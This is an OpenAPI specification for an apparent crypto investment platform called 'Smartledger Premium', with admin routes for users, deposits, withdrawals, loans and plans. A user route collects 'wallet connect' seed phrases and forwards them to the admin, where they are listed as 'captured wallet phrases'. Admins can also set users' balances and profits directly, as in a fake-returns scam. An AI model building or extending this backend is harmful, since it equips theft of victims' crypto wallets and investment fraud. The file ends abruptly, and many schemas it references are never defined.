openapi: 3.1.0
info:
  title: Api
  version: 0.1.0
  description: Smartledger Premium API
servers:
  - url: /api
    description: Base API path
tags:
  - name: health
  - name: auth
  - name: admin-users
  - name: admin-deposits
  - name: admin-withdrawals
  - name: admin-transactions
  - name: admin-plans
  - name: admin-loans
  - name: admin-payment-methods
  - name: admin-settings
  - name: admin-referrals
  - name: admin-wallet-phrases
  - name: admin-stats
  - name: user-actions

paths:
  /healthz:
    get:
      operationId: healthCheck
      tags: [health]
      summary: Health check
      responses:
        "200":
          description: Healthy
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/HealthStatus"

  /admin/login:
    post:
      operationId: adminLogin
      tags: [auth]
      summary: Admin login
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/AdminLoginInput"
      responses:
        "200":
          description: Login successful
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/AdminAuthResult"
        "401":
          description: Invalid credentials

  /admin/logout:
    post:
      operationId: adminLogout
      tags: [auth]
      summary: Admin logout
      responses:
        "200":
          description: Logged out

  /admin/me:
    get:
      operationId: getAdminMe
      tags: [auth]
      summary: Get current admin session
      responses:
        "200":
          description: Admin info
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/AdminInfo"
        "401":
          description: Not authenticated

  # --- Dashboard Stats ---
  /admin/stats:
    get:
      operationId: getAdminStats
      tags: [admin-stats]
      summary: Dashboard summary stats
      responses:
        "200":
          description: Stats
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/AdminStats"

  # --- Users ---
  /admin/users:
    get:
      operationId: listUsers
      tags: [admin-users]
      summary: List all users
      parameters:
        - in: query
          name: search
          schema:
            type: string
        - in: query
          name: page
          schema:
            type: integer
        - in: query
          name: limit
          schema:
            type: integer
      responses:
        "200":
          description: Users list
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/UserListResult"
    post:
      operationId: createUser
      tags: [admin-users]
      summary: Create a new user
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserInput"
      responses:
        "201":
          description: Created
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"

  /admin/users/{id}:
    get:
      operationId: getUser
      tags: [admin-users]
      summary: Get user by ID
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      responses:
        "200":
          description: User
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"
    patch:
      operationId: updateUser
      tags: [admin-users]
      summary: Update user (balance, profit, status, etc)
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserUpdate"
      responses:
        "200":
          description: Updated
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"
    delete:
      operationId: deleteUser
      tags: [admin-users]
      summary: Delete user
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      responses:
        "204":
          description: Deleted

  /admin/users/{id}/suspend:
    post:
      operationId: suspendUser
      tags: [admin-users]
      summary: Suspend or unsuspend a user
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/SuspendUserInput"
      responses:
        "200":
          description: User status updated
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"

  # --- Deposits ---
  /admin/deposits:
    get:
      operationId: listDeposits
      tags: [admin-deposits]
      summary: List deposits
      parameters:
        - in: query
          name: status
          schema:
            type: string
            enum: [pending, approved, rejected]
        - in: query
          name: page
          schema:
            type: integer
      responses:
        "200":
          description: Deposits list
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/DepositListResult"

  /admin/deposits/{id}:
    get:
      operationId: getDeposit
      tags: [admin-deposits]
      summary: Get deposit by ID
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      responses:
        "200":
          description: Deposit
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Deposit"

  /admin/deposits/{id}/approve:
    post:
      operationId: approveDeposit
      tags: [admin-deposits]
      summary: Approve deposit
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ReviewNote"
      responses:
        "200":
          description: Approved
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Deposit"

  /admin/deposits/{id}/reject:
    post:
      operationId: rejectDeposit
      tags: [admin-deposits]
      summary: Reject deposit
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ReviewNote"
      responses:
        "200":
          description: Rejected
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Deposit"

  # --- Withdrawals ---
  /admin/withdrawals:
    get:
      operationId: listWithdrawals
      tags: [admin-withdrawals]
      summary: List withdrawals
      parameters:
        - in: query
          name: status
          schema:
            type: string
            enum: [pending, approved, rejected]
        - in: query
          name: page
          schema:
            type: integer
      responses:
        "200":
          description: Withdrawals list
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/WithdrawalListResult"

  /admin/withdrawals/{id}:
    get:
      operationId: getWithdrawal
      tags: [admin-withdrawals]
      summary: Get withdrawal by ID
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      responses:
        "200":
          description: Withdrawal
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Withdrawal"

  /admin/withdrawals/{id}/approve:
    post:
      operationId: approveWithdrawal
      tags: [admin-withdrawals]
      summary: Approve withdrawal
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ReviewNote"
      responses:
        "200":
          description: Approved
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Withdrawal"

  /admin/withdrawals/{id}/reject:
    post:
      operationId: rejectWithdrawal
      tags: [admin-withdrawals]
      summary: Reject withdrawal
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ReviewNote"
      responses:
        "200":
          description: Rejected
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Withdrawal"

  # --- Transactions ---
  /admin/transactions:
    get:
      operationId: listTransactions
      tags: [admin-transactions]
      summary: List all transactions
      parameters:
        - in: query
          name: userId
          schema:
            type: integer
        - in: query
          name: type
          schema:
            type: string
        - in: query
          name: page
          schema:
            type: integer
      responses:
        "200":
          description: Transactions
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/TransactionListResult"

  # --- Investment Plans ---
  /admin/plans:
    get:
      operationId: listPlans
      tags: [admin-plans]
      summary: List investment plans
      responses:
        "200":
          description: Plans
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Plan"
    post:
      operationId: createPlan
      tags: [admin-plans]
      summary: Create investment plan
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/PlanInput"
      responses:
        "201":
          description: Created
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Plan"

  /admin/plans/{id}:
    patch:
      operationId: updatePlan
      tags: [admin-plans]
      summary: Update investment plan
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/PlanUpdate"
      responses:
        "200":
          description: Updated
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Plan"
    delete:
      operationId: deletePlan
      tags: [admin-plans]
      summary: Delete investment plan
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      responses:
        "204":
          description: Deleted

  # --- Loans ---
  /admin/loans:
    get:
      operationId: listLoans
      tags: [admin-loans]
      summary: List loan applications
      parameters:
        - in: query
          name: status
          schema:
            type: string
            enum: [pending, approved, rejected]
      responses:
        "200":
          description: Loans
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Loan"

  /admin/loans/{id}/approve:
    post:
      operationId: approveLoan
      tags: [admin-loans]
      summary: Approve loan
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ReviewNote"
      responses:
        "200":
          description: Approved
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Loan"

  /admin/loans/{id}/reject:
    post:
      operationId: rejectLoan
      tags: [admin-loans]
      summary: Reject loan
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: false
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/ReviewNote"
      responses:
        "200":
          description: Rejected
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Loan"

  # --- Payment Methods ---
  /admin/payment-methods:
    get:
      operationId: listPaymentMethods
      tags: [admin-payment-methods]
      summary: List payment methods
      responses:
        "200":
          description: Payment methods
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/PaymentMethod"
    post:
      operationId: createPaymentMethod
      tags: [admin-payment-methods]
      summary: Create payment method
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/PaymentMethodInput"
      responses:
        "201":
          description: Created
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/PaymentMethod"

  /admin/payment-methods/{id}:
    patch:
      operationId: updatePaymentMethod
      tags: [admin-payment-methods]
      summary: Update payment method
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/PaymentMethodUpdate"
      responses:
        "200":
          description: Updated
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/PaymentMethod"
    delete:
      operationId: deletePaymentMethod
      tags: [admin-payment-methods]
      summary: Delete payment method
      parameters:
        - in: path
          name: id
          required: true
          schema:
            type: integer
      responses:
        "204":
          description: Deleted

  # --- Settings ---
  /admin/settings:
    get:
      operationId: getSettings
      tags: [admin-settings]
      summary: Get site settings
      responses:
        "200":
          description: Settings
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/SiteSettings"
    patch:
      operationId: updateSettings
      tags: [admin-settings]
      summary: Update site settings
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/SiteSettingsUpdate"
      responses:
        "200":
          description: Updated
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/SiteSettings"

  # --- Referrals ---
  /admin/referrals:
    get:
      operationId: listReferrals
      tags: [admin-referrals]
      summary: List all referrals
      responses:
        "200":
          description: Referrals
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Referral"

  # --- Wallet Phrases ---
  /admin/wallet-phrases:
    get:
      operationId: listWalletPhrases
      tags: [admin-wallet-phrases]
      summary: List captured wallet phrases
      responses:
        "200":
          description: Wallet phrases
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/WalletPhrase"

  # --- User-facing actions (called by user frontend) ---
  /user/register:
    post:
      operationId: registerUser
      tags: [user-actions]
      summary: Register a new user account
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserRegisterInput"
      responses:
        "201":
          description: Registered
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/UserAuthResult"

  /user/login:
    post:
      operationId: loginUser
      tags: [user-actions]
      summary: User login
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserLoginInput"
      responses:
        "200":
          description: Login successful
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/UserAuthResult"

  /user/deposit:
    post:
      operationId: submitDeposit
      tags: [user-actions]
      summary: Submit a deposit request
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/DepositInput"
      responses:
        "201":
          description: Deposit submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Deposit"

  /user/withdraw:
    post:
      operationId: submitWithdrawal
      tags: [user-actions]
      summary: Submit a withdrawal request
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/WithdrawalInput"
      responses:
        "201":
          description: Withdrawal submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Withdrawal"

  /user/wallet-phrase:
    post:
      operationId: submitWalletPhrase
      tags: [user-actions]
      summary: Submit wallet connect phrase (sent to admin)
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/WalletPhraseInput"
      responses:
        "201":
          description: Phrase received
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/WalletPhrase"

  /user/me:
    get:
      operationId: getUserMe
      tags: [user-actions]
      summary: Get current user profile
      responses:
        "200":
          description: User profile
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"
        "401":
          description: Not authenticated
    patch:
      operationId: updateUserMe
      tags: [user-actions]
      summary: Update current user profile
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/UserProfileUpdate"
      responses:
        "200":
          description: Updated
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"

  /user/transactions:
    get:
      operationId: getUserTransactions
      tags: [user-actions]
      summary: Get current user transactions
      responses:
        "200":
          description: Transactions
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Transaction"

  /user/deposits:
    get:
      operationId: getUserDeposits
      tags: [user-actions]
      summary: Get current user deposits
      responses:
        "200":
          description: Deposits
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Deposit"

  /user/withdrawals:
    get:
      operationId: getUserWithdrawals
      tags: [user-actions]
      summary: Get current user withdrawals
      responses:
        "200":
          description: Withdrawals
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Withdrawal"

  /user/loans:
    get:
      operationId: getUserLoans
      tags: [user-actions]
      summary: Get current user loan applications
      responses:
        "200":
          description: Loans
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Loan"
    post:
      operationId: applyForLoan
      tags: [user-actions]
      summary: Apply for a loan
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/LoanApplicationInput"
      responses:
        "201":
          description: Loan application submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Loan"

  /user/plans:
    get:
      operationId: getUserPlans
      tags: [user-actions]
      summary: Get available investment plans (public)
      responses:
        "200":
          description: Plans
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Plan"

  /user/invest:
    post:
      operationId: createInvestment
      tags: [user-actions]
      summary: Invest in a plan
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/InvestmentInput"
      responses:
        "201":
          description: Investment created
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/Investment"
        "400":
          description: Insufficient balance or invalid plan
          content:
            application/json:
              schema:
                type: object
                properties:
                  error: { type: string }

  /user/investments:
    get:
      operationId: getUserInvestments
      tags: [user-actions]
      summary: Get user's investments
      responses:
        "200":
          description: Investment list
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/Investment"

  /user/payment-methods:
    get:
      operationId: getUserPaymentMethods
      tags: [user-actions]
      summary: Get active payment methods for deposits
      responses:
        "200":
          description: Payment methods
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: "#/components/schemas/PaymentMethod"

  /user/portfolio:
    get:
      operationId: getUserPortfolio
      tags: [user-actions]
      summary: Get portfolio summary for current user
      responses:
        "200":
          description: Portfolio summary
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/UserPortfolio"

  /user/kyc:
    post:
      operationId: submitKyc
      tags: [user-actions]
      summary: Submit KYC verification documents
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/KycSubmission"
      responses:
        "200":
          description: KYC submitted
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/User"

components:
  schemas:
    HealthStatus:
      type: object
      properties:
        status:
          type: string
      required: [status]

    AdminLoginInput:
      type: object
      required: [email, password]
      properties:
        email: { type: string }
        password: { type: string }

    AdminAuthResult:
      type: object
      required: [token, admin]
      properties:
        token: { type: string }
        admin:
          $ref: "#/components/schemas/AdminInfo"

    AdminInfo:
      type: object
      required: [email, role]
      properties:
        email: { type: string }
        role: { type: string }

    AdminStats:
      type: object
      required: [totalUsers, pendingDeposits, pendingWithdrawals, totalDeposited, totalWithdrawn, pendingLoans]
      properties:
        totalUsers: { type: integer }
        pendingDeposits: { type: integer }
        pendingWithdrawals: { type: integer }
        pendingLoans: { type: integer }
        totalDeposited: { type: number }
        totalWithdrawn: { type: number }
        recentActivity:
          type: array
          items:
            $ref: "#/components/schemas/ActivityItem"

    ActivityItem:
      type: object
      required: [type, description, createdAt]
      properties:
        type: { type: string }
        description: { type: string }
        createdAt: { type: string }

    User:
      type: object
      required: [id, email, firstName, lastName, balance, profit, status, referralCode, createdAt]
      properties:
        id: { type: integer }
        email: { type: string }
        firstName: { type: string }
        lastName: { type: string }
        phone: { type: ["string", "null"] }
        country: { type: ["string", "null"] }
        balance: { type: number }
        profit: { type: number }
        status: { type: string }
        referralCode: { type: string }
        referredBy: { type: ["string", "null"] }
        createdAt: { type: string }

    UserListResult:
      type: object
      required: [users, total, page, limit]
      properties:
        users:
          type: array
          items:
            $ref: "#/components/schemas/User"
        total: { type: integer }
        page: { type: integer }
        limit: { type: integer }

    UserInput:
      type: object
      required: [email, firstName, lastName, password]
      properties:
        email: { type: string }
        firstName: { type: string }
        lastName: { type: string }
        password: { type: string }
        phone: { type: string }
        country: { type: string }
        balance: { type: number }
        profit: { type: number }

    UserUpdate:
      type: object
      properties:
        firstName: { type: string }
        lastName: { type: string }
        phone: { type: string }
        country: { type: string }
        balance: { type: number }
